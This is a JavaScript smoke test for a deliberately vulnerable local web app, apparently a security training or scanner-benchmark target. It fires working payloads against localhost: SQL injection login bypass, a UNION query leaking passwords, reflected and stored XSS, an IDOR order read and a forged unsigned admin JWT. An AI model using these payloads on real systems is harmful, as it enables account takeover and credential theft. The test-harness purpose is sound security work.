// Smoke test: proves each planted vulnerability actually fires (and the safe control resists).
// Run after `npm start` (server on :4000). Uses Node's global fetch.
const BASE = process.env.BASE || 'http://localhost:4000';
let pass = 0;
let fail = 0;
const ok = (name, cond, detail = '') => {
  cond ? pass++ : fail++;
  console.log(`${cond ? 'PASS' : 'FAIL'}  ${name}${detail ? '  — ' + detail : ''}`);
};
const b64url = (obj) => Buffer.from(JSON.stringify(obj)).toString('base64url');
const forgeJwt = (payload) => `${b64url({ alg: 'none', typ: 'JWT' })}.${b64url(payload)}.`;
const j = async (res) => { try { return await res.json(); } catch { return null; } };

// VULN-SQLI-1: auth bypass
{
  const res = await fetch(`${BASE}/api/login`, {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username: "admin'-- ", password: 'wrong-password' }),
  });
  const data = await j(res);
  ok('SQLI-1 login auth bypass (-> admin)', res.status === 200 && data?.user?.role === 'admin',
    `status=${res.status} role=${data?.user?.role}`);
}

// legit alice login -> token for IDOR test
let aliceToken = null;
{
  const res = await fetch(`${BASE}/api/login`, {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username: 'alice', password: 'alice123' }),
  });
  aliceToken = (await j(res))?.token;
  ok('legit alice login', !!aliceToken);
}

// VULN-SQLI-2: UNION-based credential leak
{
  const q = encodeURIComponent("' UNION SELECT id, username, password, role FROM users-- -");
  const res = await fetch(`${BASE}/api/search?q=${q}`);
  const blob = JSON.stringify((await j(res)) || {});
  ok('SQLI-2 UNION cred leak', blob.includes('alice123') || blob.includes('s3cr3t-admin'));
}

// VULN-XSS-1: reflected, unescaped
{
  const res = await fetch(`${BASE}/welcome?name=${encodeURIComponent('<script>window.x=1</script>')}`);
  const html = await res.text();
  ok('XSS-1 reflected unescaped', html.includes('<script>window.x=1</script>'));
}

// VULN-IDOR-1: alice reads bob's order 1002
{
  const res = await fetch(`${BASE}/api/orders/1002`, { headers: { authorization: `Bearer ${aliceToken}` } });
  const data = await j(res);
  ok('IDOR-1 cross-user order read', res.status === 200 && data?.user_id === 2, `status=${res.status}`);
}

// VULN-AUTH-1: forged unsigned admin token
{
  const forged = forgeJwt({ sub: 99, username: 'mallory', role: 'admin' });
  const res = await fetch(`${BASE}/api/admin/users`, { headers: { authorization: `Bearer ${forged}` } });
  const data = await j(res);
  ok('AUTH-1 forged admin token accepted', res.status === 200 && Array.isArray(data), `status=${res.status}`);
}

// VULN-XSS-2: stored payload persists unescaped (rendering sink is the React client)
{
  const payload = `<img src=x onerror="window.__pntxss='nonce123'">`;
  await fetch(`${BASE}/api/comments`, {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ author: 'mallory', body: payload }),
  });
  const blob = JSON.stringify((await j(await fetch(`${BASE}/api/comments`))) || []);
  ok('XSS-2 stored payload persisted', blob.includes('onerror'));
}

// SAFE-PRODUCTS: SQLi must FAIL (true negative — proves no false positive)
{
  const q = encodeURIComponent("' OR '1'='1");
  const res = await fetch(`${BASE}/api/products?category=${q}`);
  const data = await j(res);
  ok('SAFE-PRODUCTS resists SQLi (true negative)', Array.isArray(data) && data.length === 0,
    `rows=${Array.isArray(data) ? data.length : '?'}`);
}

console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail === 0 ? 0 : 1);
